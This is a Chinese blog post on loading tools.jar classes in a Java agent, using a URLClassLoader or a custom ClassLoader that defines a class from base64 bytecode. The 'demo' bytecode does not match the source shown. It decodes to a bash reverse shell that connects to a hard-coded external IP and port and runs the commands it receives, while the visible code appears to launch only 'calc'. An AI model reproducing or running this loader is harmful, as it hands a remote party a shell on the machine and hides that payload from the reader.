# 解决agent中tools加载的问题

为什么有这个文章？因为我们在利用agent中的运行中attach pid需要利用到tools.jar的类不过默认java是不加载tools.jar类的所以我们需要解决它

解决方法是学大师傅们的方法的。

## 方法一

URLClassLoader去加载tools.jar路径并且将需要的类添加到map中，然后通过反射去实现。

代码：https://gist.github.com/Firebasky/c1efd9dc7eb964a77cb788c170a8598f

```java
java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre", "lib") + java.io.File.separator + "tools.jar");
java.net.URL url = toolsPath.toURI().toURL();
//URL url1 = new URL("file:C:\\Program Files\\java\\jdk1.8.0_201\\lib\\tools.jar");
URLClassLoader urlClassLoader = new URLClassLoader(new URL[] { url }, Thread.currentThread().getContextClassLoader());
```

## 方法二

自定义加载器

https://xz.aliyun.com/t/10075#toc-4

>自定义的classLoader。但是我们都知道classLoader在loadClass的时候采用双亲委托机制，也就是如果系统中已经存在一个类，即使我们用自定义的classLoader去loadClass，也会返回系统内置的那个类。但是如果我们绕过loadClass，直接去defineClass即可从我们指定的字节码数组里创建类，而且类名我们可以任意自定义，重写java.lang.String都没问题:) 然后再用defineClass返回的Class去实例化。

demo

```java
package sun.tools.attach;

import java.io.IOException;

public class VirtualMachine {
    public static void execute(String cmd){
        try{
            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
        }catch (IOException e){
            try{
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
            }catch (IOException ee){
            }
        }
    }
}
```



```java
package com.firebasky.demo2;

import java.lang.reflect.Method;
import java.util.Base64;

public class poc {

    public static class Myloader extends ClassLoader //继承ClassLoader
    {
        public Class get(byte[] b) {//直接使用defineClass返回class对象
            return super.defineClass(b, 0, b.length);
        }
    }

    public static void main(String[] args)
    {
        try {
            String classStr="yv66vgAAADkALgoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwcADgEAEGphdmEvbGFuZy9TdHJpbmcIABABAAkvYmluL2Jhc2gIABIBAAItYwgAFAEAVmV4ZWMgNTw+L2Rldi90Y3AvMS4xMTYuMTM2LjEyMC8yMzMzO2NhdCA8JjUgfCB3aGlsZSByZWFkIGxpbmU7IGRvICRsaW5lIDI+JjUgPiY1OyBkb25lCgAIABYMABcAGAEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAaAQATamF2YS9pby9JT0V4Y2VwdGlvbggAHAEAA2NtZAgAHgEAAi9jBwAgAQAtY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAC9MY29tL2ZpcmViYXNreS9zdW4vdG9vbHMvYXR0YWNoL1ZpcnR1YWxNYWNoaW5lOwEAB2V4ZWN1dGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAFlAQAVTGphdmEvaW8vSU9FeGNlcHRpb247AQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBABNWaXJ0dWFsTWFjaGluZS5qYXZhACEAHwACAAAAAAACAAEABQAGAAEAIQAAAC8AAQABAAAABSq3AAGxAAAAAgAiAAAABgABAAAABQAjAAAADAABAAAABQAkACUAAAAJACYAJwABACEAAAC3AAUAAwAAADy4AAcGvQANWQMSD1NZBBIRU1kFEhNTtgAVV6cAIUy4AAcGvQANWQMSG1NZBBIdU1kFKlO2ABVXpwAETbEAAgAAABoAHQAZAB4ANwA6ABkAAwAiAAAAHgAHAAAACAAaAA4AHQAJAB4ACwA3AA0AOgAMADsADwAjAAAAFgACAB4AHQAoACkAAQAAADwAHAAqAAAAKwAAABkAA10HABn/ABwAAgcADQcAGQABBwAZ+gAAAAEALAAAAAIALQ==";
            Class result = new Myloader().get(Base64.getDecoder().decode(classStr));
            for (Method m:result.getDeclaredMethods())
            {
                System.out.println(m.getName());
                if (m.getName().equals("execute"))
                {
                    m.invoke(result,"calc");
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

不得不佩服大师傅啊！！！
